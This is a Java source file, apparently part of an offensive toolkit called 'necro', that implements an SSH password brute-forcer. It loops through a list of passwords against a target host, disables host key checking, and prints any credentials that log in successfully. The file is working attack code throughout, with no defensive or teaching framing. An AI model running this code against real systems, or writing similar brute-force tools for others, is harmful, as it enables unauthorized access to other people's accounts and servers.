package org.thesecretintelligence.necro.ssh;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;
import org.thesecretintelligence.necro.Terminal;
import org.thesecretintelligence.necro.utils.Utils;

import java.util.List;

public class Ssh {

    private String user;
    private List<String> passwords;
    private String host;
    private int port;

    public Ssh(String user, List<String> passwords, int port, String host) {
        this.user = user;
        this.passwords = passwords;
        this.host = host;
        this.port = port;
    }

    public void bruteforce() {
        for (String password : passwords) {
            try {
                JSch jsch = new JSch();
                Session session = jsch.getSession(user, host, port);
                session.setPassword(password);
                java.util.Properties config = new java.util.Properties();
                config.put("StrictHostKeyChecking", "no");
                session.setConfig(config);
                session.setTimeout(3000);
                session.connect();
                System.out.println(Utils.ANSI_GREEN + "[*] " + Utils.ANSI_GREEN + "Bruteforce Successful using the Credentials " + user + ":" + password + Utils.ANSI_RESET);
                session.disconnect();
                break;
            } catch (Exception e) {
                System.out.println(Utils.ANSI_RED + "[-] " + Utils.ANSI_RESET + "Could not login using the Credentials " + user + ":" + password);
            }
        }
        Terminal.resetPrefix();
        Terminal.getInput();
    }

}
